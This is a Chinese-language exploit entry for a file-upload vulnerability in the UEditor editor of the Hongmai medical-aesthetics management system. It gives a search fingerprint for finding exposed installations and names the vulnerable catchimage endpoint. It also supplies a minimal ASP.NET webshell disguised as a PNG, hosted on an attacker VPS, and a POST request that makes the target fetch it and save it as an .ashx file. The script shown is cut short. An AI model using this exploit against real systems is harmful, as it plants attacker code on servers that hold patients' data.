# 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞

- **系统**：宏脉医美行业管理系统UEditor编辑器　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="宏脉医美行业管理系统"`
- **请求**：`POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1`

**请求体 / payload**
```
1. 新建文件，内容为webshell，文件命令为`1.png`
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
ctx.Response.Write("hello");
2. 将`1.png`传到vpn上，使用python起个http服务
python3 -m http.server 50000
3. 替换`source[]`为webshell文件地址，通过exp上传文件
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
source[]=http://vpsip/1.png?.ashx
5. 上传文件位置
/upload/images/Ctmicall/20240102…（脚本共 631 字，完整版见原文）
```

**其他**
- 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏脉医美行业管理系统